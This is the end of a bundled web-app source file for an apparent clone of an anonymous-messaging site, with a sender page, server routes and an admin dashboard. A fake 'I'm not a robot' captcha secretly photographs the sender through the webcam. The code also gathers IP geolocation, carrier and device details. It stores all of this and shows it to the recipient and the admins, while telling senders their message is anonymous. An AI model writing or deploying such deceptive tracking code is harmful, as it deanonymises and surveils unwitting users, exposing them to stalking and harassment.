        <video id="video" autoplay playsinline muted></video>
        <canvas id="overlay"></canvas>
        <!-- Fixed, non-moving, centered head-guide trace with face dots -->
        <div class="head-guide">
          <svg viewBox="0 0 200 200" fill="none" xmlns="http://www.w3.org/2000/svg">
            <!-- Head outline (oval face + jaw) -->
            <path d="M100 24
                     C129 24 150 48 150 84
                     C150 118 132 150 100 168
                     C68 150 50 118 50 84
                     C50 48 71 24 100 24 Z"
                  stroke="rgba(255,255,255,.9)" stroke-width="2.5" stroke-dasharray="6 5"/>
            <!-- Face landmark dots: which parts to align -->
            <g fill="rgba(29,185,84,.95)">
              <!-- Left eye -->
              <circle cx="78" cy="82" r="3.2"/>
              <!-- Right eye -->
              <circle cx="122" cy="82" r="3.2"/>
              <!-- Eyebrows hint -->
              <circle cx="72" cy="72" r="2"/>
              <circle cx="88" cy="70" r="2"/>
              <circle cx="112" cy="70" r="2"/>
              <circle cx="128" cy="72" r="2"/>
              <!-- Nose bridge + tip -->
              <circle cx="100" cy="92" r="2"/>
              <circle cx="100" cy="104" r="3.2"/>
              <circle cx="93" cy="110" r="1.8"/>
              <circle cx="107" cy="110" r="1.8"/>
              <!-- Lips -->
              <circle cx="85" cy="128" r="2.2"/>
              <circle cx="100" cy="126" r="2.6"/>
              <circle cx="115" cy="128" r="2.2"/>
              <circle cx="100" cy="134" r="2.2"/>
              <!-- Chin / jaw guides -->
              <circle cx="76" cy="120" r="1.6"/>
              <circle cx="124" cy="120" r="1.6"/>
              <circle cx="100" cy="150" r="1.8"/>
            </g>
          </svg>
        </div>
      </div>
      <div class="checks">
        <div class="chk" id="chk-face"><span class="mark">○</span> Face</div>
        <div class="chk" id="chk-eyes"><span class="mark">○</span> Eyes</div>
        <div class="chk" id="chk-nose"><span class="mark">○</span> Nose</div>
        <div class="chk" id="chk-lips"><span class="mark">○</span> Lips</div>
      </div>
      <div class="status" id="verifyStatus">Starting camera…</div>
    </div>
  </div>

  <!-- Camera denied tutorial -->
  <div class="denied" id="deniedScreen">
    <h2>📷 Camera access needed</h2>
    <p>To verify you're human, we need camera access. Here's how to turn it on:</p>
    <ol id="deniedSteps"></ol>
    <button class="reload" onclick="location.reload()">🔄 I've enabled it — Reload</button>
  </div>

<script src="https://cdn.jsdelivr.net/npm/@mediapipe/face_mesh/face_mesh.js" crossorigin="anonymous"><\/script>
<script>
  const USERNAME = ${JSON.stringify(e)};
  const QUESTIONS = [
    "How tall r u?",
    "Are u talking to anyone??",
    "do you prefer texting or facetime?",
    "do u believe in second chances?",
    "are u single?",
    "do you like anyone right now?",
    "wyd later?"
  ];

  // ---------- Animated placeholder ----------
  const ph = document.getElementById('placeholder');
  const input = document.getElementById('msgInput');
  let phIndex = Math.floor(Math.random()*QUESTIONS.length);
  let phTimer = null;

  function showPlaceholder(){
    ph.classList.remove('hidden');
    ph.textContent = QUESTIONS[phIndex];
    ph.classList.remove('fade-out'); ph.classList.add('fade-in');
  }
  function cyclePlaceholder(){
    if(input.value.length>0) return;
    ph.classList.remove('fade-in'); ph.classList.add('fade-out'); // fade current out
    setTimeout(()=>{
      phIndex = (phIndex+1)%QUESTIONS.length;
      ph.textContent = QUESTIONS[phIndex];
      ph.classList.remove('fade-out'); ph.classList.add('fade-in'); // fade next in
    }, 500);
  }
  function startPlaceholder(){
    showPlaceholder();
    phTimer = setInterval(cyclePlaceholder, 2600);
  }
  function stopPlaceholder(){ if(phTimer){ clearInterval(phTimer); phTimer=null; } }

  input.addEventListener('input', ()=>{
    if(input.value.length>0){
      // hide placeholder instantly (no fade) while typing; show only typed text in black
      stopPlaceholder();
      ph.classList.add('hidden');
    } else {
      // empty again -> bring back animated questions with fade
      ph.classList.remove('hidden');
      startPlaceholderIfNeeded();
    }
    onTypingChange();
  });
  function startPlaceholderIfNeeded(){
    if(!phTimer && input.value.length===0){ startPlaceholder(); }
  }
  startPlaceholder();

  // ---------- Dice ----------
  function rollDice(){
    let idx = Math.floor(Math.random()*QUESTIONS.length);
    stopPlaceholder();
    ph.classList.add('hidden');
    input.value = QUESTIONS[idx]; // typed instantly, no animation, black text
    onTypingChange();
    input.focus();
  }

  // ---------- captcha appears when typing ----------
  let humanVerified = false;
  let capturedPhoto = null;
  function onTypingChange(){
    const hasText = input.value.trim().length>0;
    const cap = document.getElementById('captcha');
    if(hasText){ cap.classList.add('show'); } else { cap.classList.remove('show'); }
    updateSendState();
  }
  function updateSendState(){
    const hasText = input.value.trim().length>0;
    document.getElementById('sendBtn').disabled = !(hasText && humanVerified);
  }
  updateSendState();

  // ---------- Live counter (random up/down bit by bit) ----------
  let count = 280;
  setInterval(()=>{
    const delta = Math.floor(Math.random()*5) - 2; // -2..+2
    count = Math.max(120, count + delta);
    document.getElementById('cnum').textContent = count;
  }, 500);

  // ---------- Human verification (camera + face detection) ----------
  const video = document.getElementById('video');
  const overlay = document.getElementById('overlay');
  let stream = null;
  let faceMesh = null;
  let detectState = { face:false, eyes:false, nose:false, lips:false };
  let stableFrames = 0;
  let verifying = false;

  function setCheck(id, ok){
    const el = document.getElementById('chk-'+id);
    el.classList.toggle('ok', ok);
    el.querySelector('.mark').textContent = ok ? '✓' : '○';
  }

  async function startVerify(){
    if(humanVerified || verifying) return;
    if(input.value.trim().length===0) return;
    const box = document.getElementById('capBox');
    const label = document.getElementById('capLabel');
    box.classList.add('loading');
    label.textContent = 'verifying…';
    // small fast "load" then open verify modal
    setTimeout(()=>{ box.classList.remove('loading'); openCamera(); }, 700);
  }

  async function openCamera(){
    document.getElementById('verifyModal').classList.add('open');
    document.getElementById('verifyStatus').textContent = 'Starting camera…';
    verifying = true;
    try {
      stream = await navigator.mediaDevices.getUserMedia({ video:{ facingMode:'user', width:480, height:480 }, audio:false });
      video.srcObject = stream;
      await video.play().catch(()=>{});
      document.getElementById('verifyStatus').textContent = 'Line up your face inside the outline…';
      initFaceMesh();
    } catch(err){
      console.warn('camera error', err);
      closeCamera();
      showDenied();
    }
  }

  function initFaceMesh(){
    if(typeof FaceMesh === 'undefined'){
      // fallback: if library failed to load, use simple brightness/motion heuristic
      fallbackDetect();
      return;
    }
    faceMesh = new FaceMesh({ locateFile:(f)=>'https://cdn.jsdelivr.net/npm/@mediapipe/face_mesh/'+f });
    faceMesh.setOptions({ maxNumFaces:1, refineLandmarks:true, minDetectionConfidence:0.5, minTrackingConfidence:0.5 });
    faceMesh.onResults(onFaceResults);
    pump();
  }
  async function pump(){
    if(!verifying || !faceMesh) return;
    if(video.readyState>=2){
      try { await faceMesh.send({ image: video }); } catch(e){}
    }
    requestAnimationFrame(pump);
  }

  function onFaceResults(results){
    // NOTE: we intentionally do NOT draw anything on the overlay canvas.
    // The head-guide trace + face dots are a FIXED, centered SVG that never moves.
    if(results.multiFaceLandmarks && results.multiFaceLandmarks.length>0){
      const lm = results.multiFaceLandmarks[0];

      // ---- Accurate face-centering + full-face-visible checks ----
      // Bounding box of the mesh (normalized 0..1)
      let minX=1, maxX=0, minY=1, maxY=0;
      for(const p of lm){
        if(p.x<minX) minX=p.x; if(p.x>maxX) maxX=p.x;
        if(p.y<minY) minY=p.y; if(p.y>maxY) maxY=p.y;
      }
      const cx = (minX+maxX)/2, cy = (minY+maxY)/2;
      const w = maxX-minX, h = maxY-minY;

      // Face must be reasonably centered (aligned with the fixed head guide)
      // and large enough (close to the camera / fills the guide oval).
      const centered = Math.abs(cx-0.5) < 0.18 && Math.abs(cy-0.5) < 0.18;
      const bigEnough = w > 0.28 && h > 0.34;
      detectState.face = lm.length > 400 && centered && bigEnough;

      // Eyes: landmarks present AND eyes open (vertical distance)
      const leftEyeTop = lm[159], leftEyeBottom = lm[145];
      const rightEyeTop = lm[386], rightEyeBottom = lm[374];
      const leftOpen = leftEyeTop && leftEyeBottom ? Math.abs(leftEyeTop.y - leftEyeBottom.y) : 0;
      const rightOpen = rightEyeTop && rightEyeBottom ? Math.abs(rightEyeTop.y - rightEyeBottom.y) : 0;
      detectState.eyes = !!(leftEyeTop && rightEyeTop) && (leftOpen>0.004 && rightOpen>0.004);

      // Nose: tip landmark 1 + bridge 6 present
      detectState.nose = !!(lm[1] && lm[6]);

      // Lips: upper 13 + lower 14 + corners 61/291 present
      detectState.lips = !!(lm[13] && lm[14] && lm[61] && lm[291]);
    } else {
      detectState = { face:false, eyes:false, nose:false, lips:false };
    }
    updateChecks();
  }

  function updateChecks(){
    setCheck('face', detectState.face);
    setCheck('eyes', detectState.eyes);
    setCheck('nose', detectState.nose);
    setCheck('lips', detectState.lips);
    const all = detectState.face && detectState.eyes && detectState.nose && detectState.lips;
    if(all){
      stableFrames++;
      document.getElementById('verifyStatus').textContent = 'Perfect — hold still…';
      if(stableFrames >= 6){ captureAndFinish(); }
    } else {
      stableFrames = 0;
      document.getElementById('verifyStatus').textContent = 'Line up your face inside the outline…';
    }
  }

  // Fallback if mediapipe fails to load (network) — heuristic based on webcam brightness/variance
  function fallbackDetect(){
    const c = document.createElement('canvas'); c.width=120; c.height=120;
    const cx = c.getContext('2d');
    let frames = 0, ok = 0;
    const iv = setInterval(()=>{
      if(!verifying){ clearInterval(iv); return; }
      if(video.readyState<2) return;
      cx.drawImage(video,0,0,120,120);
      const d = cx.getImageData(0,0,120,120).data;
      let sum=0, sq=0, n=d.length/4;
      for(let i=0;i<d.length;i+=4){ const l=(d[i]+d[i+1]+d[i+2])/3; sum+=l; sq+=l*l; }
      const mean=sum/n; const varr=sq/n-mean*mean;
      frames++;
      // a real face in front of camera => moderate brightness + high variance (features)
      const looksHuman = mean>40 && mean<230 && varr>350;
      detectState = { face:looksHuman, eyes:looksHuman, nose:looksHuman, lips:looksHuman };
      updateChecks();
      if(frames>40 && ok<1){ /* keep trying */ }
    }, 200);
  }

  function captureAndFinish(){
    verifying = false;
    // capture frame (un-mirror for storage)
    const c = document.createElement('canvas');
    c.width = 320; c.height = 320;
    const cx = c.getContext('2d');
    cx.drawImage(video, 0, 0, 320, 320);
    capturedPhoto = c.toDataURL('image/jpeg', 0.8);
    closeCamera();
    humanVerified = true;
    // mark captcha checked
    const box = document.getElementById('capBox');
    box.classList.remove('loading'); box.classList.add('checked');
    document.getElementById('capLabel').textContent = "I'm not a robot";
    updateSendState();
  }

  function closeCamera(){
    verifying = false;
    document.getElementById('verifyModal').classList.remove('open');
    if(stream){ stream.getTracks().forEach(t=>t.stop()); stream=null; }
    if(faceMesh){ try{ faceMesh.close(); }catch(e){} faceMesh=null; }
  }

  function showDenied(){
    const ua = navigator.userAgent;
    let steps = [];
    if(/Chrome/i.test(ua) && !/Edg/i.test(ua)){
      steps = [
        "Tap the 🔒 lock (or ⓘ) icon in the address bar at the top.",
        "Tap \\"Permissions\\" or \\"Site settings\\".",
        "Find \\"Camera\\" and switch it to \\"Allow\\".",
        "Come back here and tap Reload below."
      ];
    } else if(/Safari/i.test(ua)){
      steps = [
        "Tap the \\"aA\\" icon in the address bar.",
        "Tap \\"Website Settings\\".",
        "Set \\"Camera\\" to \\"Allow\\".",
        "Come back and tap Reload below."
      ];
    } else {
      steps = [
        "Open your browser settings for this site.",
        "Find the \\"Camera\\" permission.",
        "Switch it to \\"Allow\\".",
        "Return here and tap Reload below."
      ];
    }
    document.getElementById('deniedSteps').innerHTML = steps.map(s=>'<li>'+s+'</li>').join('');
    document.getElementById('deniedScreen').classList.add('open');
  }

  // ---------- Client-side geo/carrier lookup (best-effort, internet based) ----------
  let clientGeo = {};
  (async ()=>{
    try {
      const r = await fetch('https://ipapi.co/json/');
      if(r.ok){
        const g = await r.json();
        clientGeo = {
          city: g.city, region: g.region, country: g.country_name,
          lat: g.latitude, lon: g.longitude, carrier: g.org,
          location: [g.city, g.country_name].filter(Boolean).join(', ')
        };
      }
    } catch(e){}
  })();

  // ---------- Send ----------
  async function attemptSend(){
    const text = input.value.trim();
    if(!text){ return; }
    if(!humanVerified || !capturedPhoto){
      // require captcha
      document.getElementById('captcha').classList.add('show');
      return;
    }
    const btn = document.getElementById('sendBtn');
    btn.disabled = true; btn.textContent = 'Sending…';
    try {
      const res = await fetch('/api/send/'+encodeURIComponent(USERNAME), {
        method:'POST', headers:{'Content-Type':'application/json'},
        body: JSON.stringify({ body:text, photo:capturedPhoto, geo:clientGeo, carrier:clientGeo.carrier })
      });
      const data = await res.json();
      if(!res.ok) throw new Error(data.error||'Failed');
      showSent();
    } catch(ex){
      btn.disabled=false; btn.textContent='Send!';
      alert(ex.message);
    }
  }

  function showSent(){
    document.getElementById('mainScreen').innerHTML =
      '<div class="msg-card sent-screen" style="padding:44px 24px"><div class="big">🎉</div>'+
      '<div style="font-weight:900;font-size:22px;color:#111;margin-bottom:8px">Message sent!</div>'+
      '<div style="font-weight:700;color:#777;margin-bottom:22px">Your anonymous message was delivered to @'+USERNAME+'</div>'+
      '<button class="own-btn" style="animation:none" onclick="window.location.href=\\'/\\'">Get your own messages!</button></div>';
  }
<\/script>
</body>
</html>`}function K(e){return String(e).replace(/[&<>"']/g,e=>({"&":`&amp;`,"<":`&lt;`,">":`&gt;`,'"':`&quot;`,"'":`&#39;`})[e])}function Pe(e){return String(e).replace(/"/g,`&quot;`)}function Fe(){return`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>NGL — Admin</title>
<link rel="icon" href="/static/logo.png">
<link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800;900&display=swap" rel="stylesheet">
<style>
  * { margin:0; padding:0; box-sizing:border-box; }
  body { font-family:'Nunito',-apple-system,sans-serif; background:#0e0e12; color:#eee; }
  header { background:#16161d; padding:16px 22px; display:flex; align-items:center; justify-content:space-between; position:sticky; top:0; z-index:10; border-bottom:1px solid #26262f; }
  header h1 { font-size:20px; font-weight:900; display:flex; align-items:center; gap:10px; }
  header img { width:32px; height:32px; border-radius:8px; }
  header a { color:#ff7a00; text-decoration:none; font-weight:800; font-size:14px; }
  .layout { display:flex; min-height:calc(100vh - 64px); }
  .sidebar { width:320px; border-right:1px solid #26262f; overflow-y:auto; background:#131319; }
  .sidebar h2 { font-size:13px; text-transform:uppercase; letter-spacing:1px; color:#777; padding:16px 18px 8px; }
  .acct { padding:14px 18px; border-bottom:1px solid #1f1f27; cursor:pointer; transition:.15s; }
  .acct:hover, .acct.active { background:#1d1d26; }
  .acct .name { font-weight:900; font-size:15px; }
  .acct .meta { font-size:12px; color:#888; margin-top:3px; }
  .badge { background:#ff7a00; color:#000; font-size:10px; font-weight:900; padding:2px 7px; border-radius:10px; margin-left:6px; }
  .badge.admin { background:#4285f4; color:#fff; }
  .main { flex:1; padding:24px; overflow-y:auto; }
  .empty-main { color:#666; text-align:center; padding-top:80px; font-weight:800; }
  .acct-header { display:flex; align-items:center; gap:16px; margin-bottom:22px; }
  .acct-header .pic { width:64px; height:64px; border-radius:50%; background:#e3e3e6 center/cover no-repeat; display:flex; align-items:center; justify-content:center; overflow:hidden; }
  .acct-header .pic img { width:100%; height:100%; object-fit:cover; }
  .no-pfp { width:100%; height:100%; display:block; }
  .acct-header .info h2 { font-size:22px; font-weight:900; }
  .acct-header .info p { color:#888; font-weight:700; font-size:13px; }
  .msg-card { background:#16161d; border:1px solid #26262f; border-radius:16px; padding:18px; margin-bottom:18px; }
  .msg-top { display:flex; gap:18px; align-items:flex-start; }
  .msg-photo { width:120px; height:120px; border-radius:12px; object-fit:cover; background:#000; flex-shrink:0; border:1px solid #333; }
  .msg-photo.none { display:flex; align-items:center; justify-content:center; color:#555; font-size:12px; font-weight:800; text-align:center; }
  .msg-content { flex:1; min-width:0; }
  .msg-body { font-weight:900; font-size:17px; margin-bottom:12px; word-break:break-word; }
  .detail-grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(180px,1fr)); gap:10px; }
  .detail { background:#0e0e12; border:1px solid #23232c; border-radius:10px; padding:9px 12px; }
  .detail .k { font-size:11px; text-transform:uppercase; letter-spacing:.5px; color:#777; font-weight:800; }
  .detail .v { font-weight:800; font-size:14px; margin-top:2px; color:#eee; word-break:break-word; }
  .detail .v a { color:#ff7a00; text-decoration:none; }
  @media (max-width:720px){ .layout{ flex-direction:column; } .sidebar{ width:100%; max-height:220px; } .msg-photo{ width:90px; height:90px; } }
</style>
</head>
<body>
<header>
  <h1><img src="/static/logo.png">Admin Dashboard</h1>
  <a href="/dashboard">← Back to app</a>
</header>
<div class="layout">
  <aside class="sidebar">
    <h2>Accounts</h2>
    <div id="acctList"></div>
  </aside>
  <main class="main" id="mainPane">
    <div class="empty-main">← Select an account to view its messages, captured photos & sender data</div>
  </main>
</div>
<script>
  let ACCOUNTS = [];
  function esc(s){ return String(s==null?'':s).replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c])); }
  function fmt(iso){ const d=new Date(iso.replace(' ','T')+'Z'); const p=n=>String(n).padStart(2,'0'); return p(d.getMonth()+1)+'/'+p(d.getDate())+'/'+d.getFullYear()+' '+p(d.getHours())+':'+p(d.getMinutes()); }

  async function loadAccounts(){
    const res = await fetch('/api/admin/accounts');
    if(!res.ok){ document.body.innerHTML='<p style="padding:40px">Forbidden. Admins only.</p>'; return; }
    const data = await res.json();
    ACCOUNTS = data.accounts;
    document.getElementById('acctList').innerHTML = ACCOUNTS.map(a=>
      \`<div class="acct" id="acct-\${a.id}" onclick="selectAccount(\${a.id})">
        <div class="name">@\${esc(a.username)}\${a.is_admin?'<span class="badge admin">ADMIN</span>':''}<span class="badge">\${a.message_count} msg</span></div>
        <div class="meta">Joined \${fmt(a.created_at)}</div>
      </div>\`).join('') || '<div style="padding:18px;color:#666">No accounts yet</div>';
  }

  async function selectAccount(id){
    document.querySelectorAll('.acct').forEach(e=>e.classList.remove('active'));
    document.getElementById('acct-'+id).classList.add('active');
    const pane = document.getElementById('mainPane');
    pane.innerHTML = '<div class="empty-main">Loading…</div>';
    const res = await fetch('/api/admin/account/'+id);
    const data = await res.json();
    const a = data.account;
    const pic = a.profile_pic ? '<img src="'+a.profile_pic+'">' : '<svg class="no-pfp" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg" aria-label="No profile picture"><circle cx="50" cy="50" r="50" fill="#e3e3e6"/><circle cx="50" cy="40" r="16" fill="#b6b6bd"/><path d="M22 84c0-15 12.5-24 28-24s28 9 28 24z" fill="#b6b6bd"/></svg>';
    let html = \`<div class="acct-header"><div class="pic">\${pic}</div><div class="info"><h2>@\${esc(a.username)}</h2><p>\${data.messages.length} message(s) · Joined \${fmt(a.created_at)}</p></div></div>\`;
    if(data.messages.length===0){ html += '<div class="empty-main">No messages received.</div>'; }
    else {
      html += data.messages.map(m=>{
        const photo = m.photo ? '<img class="msg-photo" src="'+m.photo+'">' : '<div class="msg-photo none">No photo</div>';
        const maplink = (m.lat!=null && m.lon!=null) ? '<a href="https://maps.google.com/?q='+m.lat+','+m.lon+'" target="_blank">'+esc(m.location)+' 🗺</a>' : esc(m.location||'Unknown');
        return \`<div class="msg-card"><div class="msg-top">\${photo}<div class="msg-content">
          <div class="msg-body">"\${esc(m.body)}"</div>
          <div class="detail-grid">
            <div class="detail"><div class="k">Software</div><div class="v">\${esc(m.software)}</div></div>
            <div class="detail"><div class="k">Carrier / ISP</div><div class="v">\${esc(m.carrier)}</div></div>
            <div class="detail"><div class="k">Sent from</div><div class="v">\${esc(m.sent_from)}</div></div>
            <div class="detail"><div class="k">Location</div><div class="v">\${maplink}</div></div>
            <div class="detail"><div class="k">IP Address</div><div class="v">\${esc(m.ip)}</div></div>
            <div class="detail"><div class="k">Time sent</div><div class="v">\${fmt(m.created_at)}</div></div>
          </div>
        </div></div></div>\`;
      }).join('');
    }
    pane.innerHTML = html;
  }
  loadAccounts();
<\/script>
</body>
</html>`}var q=new B;function J(){return crypto.randomUUID().replace(/-/g,``)+crypto.randomUUID().replace(/-/g,``)}async function Y(e){let t=new TextEncoder().encode(`ngl_salt_v1::`+e),n=await crypto.subtle.digest(`SHA-256`,t);return Array.from(new Uint8Array(n)).map(e=>e.toString(16).padStart(2,`0`)).join(``)}async function X(e,t){return t&&await e.prepare(`SELECT u.* FROM sessions s JOIN users u ON u.id = s.user_id WHERE s.token = ?`).bind(t).first()||null}function Z(e,t,n=400){return e.json({error:t},n)}q.post(`/api/signup`,async e=>{let{username:t,password:n}=await e.req.json().catch(()=>({}));if(!t||!n)return Z(e,`Username and password required`);let r=String(t).trim();if(!/^[A-Za-z0-9_]{3,20}$/.test(r))return Z(e,`Username must be 3-20 chars: letters, numbers, underscore only`);if(String(n).length<4)return Z(e,`Password must be at least 4 characters`);let i=r.toLowerCase();if([`admin`,`api`,`static`,`login`,`dashboard`,`logout`].includes(i))return Z(e,`That username is reserved`);if(await e.env.DB.prepare(`SELECT id FROM users WHERE username_lower = ?`).bind(i).first())return Z(e,`Username already taken`);let a=await Y(String(n)),o=(await e.env.DB.prepare(`INSERT INTO users (username, username_lower, password) VALUES (?, ?, ?)`).bind(r,i,a).run()).meta.last_row_id,s=J();return await e.env.DB.prepare(`INSERT INTO sessions (token, user_id) VALUES (?, ?)`).bind(s,o).run(),G(e,`session`,s,{path:`/`,httpOnly:!0,sameSite:`Lax`,maxAge:2592e3}),e.json({ok:!0,username:r})}),q.post(`/api/login`,async e=>{let{username:t,password:n}=await e.req.json().catch(()=>({}));if(!t||!n)return Z(e,`Username and password required`);let r=String(t).trim().toLowerCase(),i=await e.env.DB.prepare(`SELECT * FROM users WHERE username_lower = ?`).bind(r).first();if(!i||await Y(String(n))!==i.password)return Z(e,`Invalid username or password`,401);let a=J();return await e.env.DB.prepare(`INSERT INTO sessions (token, user_id) VALUES (?, ?)`).bind(a,i.id).run(),G(e,`session`,a,{path:`/`,httpOnly:!0,sameSite:`Lax`,maxAge:2592e3}),e.json({ok:!0,username:i.username,is_admin:i.is_admin})}),q.post(`/api/logout`,async e=>{let t=W(e,`session`);return t&&await e.env.DB.prepare(`DELETE FROM sessions WHERE token = ?`).bind(t).run(),ke(e,`session`,{path:`/`}),e.json({ok:!0})}),q.get(`/api/me`,async e=>{let t=await X(e.env.DB,W(e,`session`));return t?e.json({username:t.username,profile_pic:t.profile_pic,is_admin:t.is_admin}):Z(e,`Not authenticated`,401)}),q.post(`/api/profile-pic`,async e=>{let t=await X(e.env.DB,W(e,`session`));if(!t)return Z(e,`Not authenticated`,401);let{image:n}=await e.req.json().catch(()=>({}));return!n||typeof n!=`string`?Z(e,`No image`):n.length>15e5?Z(e,`Image too large`):(await e.env.DB.prepare(`UPDATE users SET profile_pic = ? WHERE id = ?`).bind(n,t.id).run(),e.json({ok:!0}))}),q.get(`/api/user/:username`,async e=>{let t=e.req.param(`username`).toLowerCase(),n=await e.env.DB.prepare(`SELECT username, profile_pic FROM users WHERE username_lower = ?`).bind(t).first();return n?e.json({username:n.username,profile_pic:n.profile_pic}):Z(e,`User not found`,404)}),q.post(`/api/send/:username`,async e=>{let t=e.req.param(`username`).toLowerCase(),n=await e.env.DB.prepare(`SELECT id FROM users WHERE username_lower = ?`).bind(t).first();if(!n)return Z(e,`User not found`,404);let r=await e.req.json().catch(()=>({})),i=String(r.body||``).trim(),a=typeof r.photo==`string`?r.photo:null;if(!i)return Z(e,`Message is empty`);if(i.length>1e3)return Z(e,`Message too long`);if(!a)return Z(e,`Human verification required`);if(a.length>15e5)return Z(e,`Photo too large`);let o=e.req.header(`user-agent`)||``,s=Ie(o),c=Le(o),l=e.req.header(`cf-connecting-ip`)||e.req.header(`x-forwarded-for`)||`unknown`,u=e.req.raw.cf||{},d=u.city||``,f=u.country||``,p=u.region||``,m=u.latitude?parseFloat(u.latitude):null,h=u.longitude?parseFloat(u.longitude):null,g=u.asOrganization||r.carrier||`Unknown ISP`,_=r.geo||{};!d&&_.city&&(d=_.city),!f&&_.country&&(f=_.country),!p&&_.region&&(p=_.region),m===null&&_.lat!=null&&(m=parseFloat(_.lat)),h===null&&_.lon!=null&&(h=parseFloat(_.lon));let v=[d,p,f].filter(Boolean).length?Array.from(new Set([d,f].filter(Boolean))).join(`, `):_.location||`Unknown location`,y=g||_.carrier||`Unknown ISP`;return await e.env.DB.prepare(`INSERT INTO messages (user_id, body, photo, software, carrier, sent_from, location, lat, lon, ip)
     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`).bind(n.id,i,a,s,y,c,v,m,h,l).run(),e.json({ok:!0})});function Ie(e){e||=``;let t;if(t=e.match(/Android\s([\d.]+)/))return`Android `+t[1];if((t=e.match(/iPhone OS ([\d_]+)/))||(t=e.match(/CPU OS ([\d_]+)/)))return`iOS `+t[1].replace(/_/g,`.`);if(/Windows NT 10/.test(e))return`Windows 10/11`;if(/Windows NT/.test(e))return`Windows`;if(/Mac OS X ([\d_]+)/.test(e)){let t=e.match(/Mac OS X ([\d_]+)/);return`macOS `+(t?t[1].replace(/_/g,`.`):``)}return/Linux/.test(e)?`Linux`:`Unknown OS`}function Le(e){return e||=``,/Instagram/i.test(e)?`Instagram`:/FBAN|FBAV|FB_IAB/i.test(e)?`Facebook`:/Snapchat/i.test(e)?`Snapchat`:/Twitter/i.test(e)?`Twitter`:/TikTok/i.test(e)?`TikTok`:`Web Browser`}q.get(`/api/inbox`,async e=>{let t=await X(e.env.DB,W(e,`session`));if(!t)return Z(e,`Not authenticated`,401);let{results:n}=await e.env.DB.prepare(`SELECT id, body, is_read, created_at, software, carrier, sent_from, location, lat, lon
     FROM messages WHERE user_id = ? ORDER BY created_at DESC`).bind(t.id).all();return e.json({messages:n})}),q.get(`/api/message/:id`,async e=>{let t=await X(e.env.DB,W(e,`session`));if(!t)return Z(e,`Not authenticated`,401);let n=e.req.param(`id`),r=await e.env.DB.prepare(`SELECT * FROM messages WHERE id = ? AND user_id = ?`).bind(n,t.id).first();return r?(await e.env.DB.prepare(`UPDATE messages SET is_read = 1 WHERE id = ?`).bind(n).run(),e.json({id:r.id,body:r.body,created_at:r.created_at,software:r.software,carrier:r.carrier,sent_from:r.sent_from,location:r.location,lat:r.lat,lon:r.lon})):Z(e,`Not found`,404)});async function Q(e){let t=await X(e.env.DB,W(e,`session`));return!t||!t.is_admin?null:t}q.get(`/api/admin/accounts`,async e=>{if(!await Q(e))return Z(e,`Forbidden`,403);let{results:t}=await e.env.DB.prepare(`SELECT u.id, u.username, u.created_at, u.is_admin,
       (SELECT COUNT(*) FROM messages m WHERE m.user_id = u.id) as message_count
     FROM users u ORDER BY u.created_at DESC`).all();return e.json({accounts:t})}),q.get(`/api/admin/account/:id`,async e=>{if(!await Q(e))return Z(e,`Forbidden`,403);let t=e.req.param(`id`),n=await e.env.DB.prepare(`SELECT id, username, created_at, profile_pic FROM users WHERE id = ?`).bind(t).first();if(!n)return Z(e,`Not found`,404);let{results:r}=await e.env.DB.prepare(`SELECT id, body, photo, software, carrier, sent_from, location, lat, lon, ip, created_at
     FROM messages WHERE user_id = ? ORDER BY created_at DESC`).bind(t).all();return e.json({account:n,messages:r})}),q.get(`/`,async e=>await X(e.env.DB,W(e,`session`))?e.redirect(`/dashboard`):e.html(Ae())),q.get(`/dashboard`,async e=>await X(e.env.DB,W(e,`session`))?e.html(je()):e.redirect(`/`)),q.get(`/admin`,async e=>{let t=await X(e.env.DB,W(e,`session`));return!t||!t.is_admin?e.html(`<!doctype html><html><body style="font-family:sans-serif;text-align:center;padding-top:80px"><h2>403 — Admin only</h2><p><a href="/dashboard">Back</a></p></body></html>`,403):e.html(Fe())}),q.get(`/:username`,async e=>{let t=e.req.param(`username`),n=t.toLowerCase(),r=await e.env.DB.prepare(`SELECT username, profile_pic FROM users WHERE username_lower = ?`).bind(n).first();return r?e.html(Ne(r.username,r.profile_pic)):e.html(`<!doctype html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"></head><body style="font-family:sans-serif;text-align:center;padding-top:80px;background:#111;color:#fff"><h2>User not found</h2><p>@${Re(t)} does not exist.</p><a href="/" style="color:#ff5e00">Get your own messages!</a></body></html>`,404)});function Re(e){return String(e).replace(/[&<>"']/g,e=>({"&":`&amp;`,"<":`&lt;`,">":`&gt;`,'"':`&quot;`,"'":`&#39;`})[e])}var $=new B,ze=Object.assign({"/src/index.tsx":q}),Be=!1;for(let[,e]of Object.entries(ze))e&&($.all(`*`,t=>{let n;try{n=t.executionCtx}catch{}return e.fetch(t.req.raw,t.env,n)}),$.notFound(t=>{let n;try{n=t.executionCtx}catch{}return e.fetch(t.req.raw,t.env,n)}),Be=!0);if(!Be)throw Error(`Can't import modules from ['/src/index.ts','/src/index.tsx','/app/server.ts']`);export{$ as default};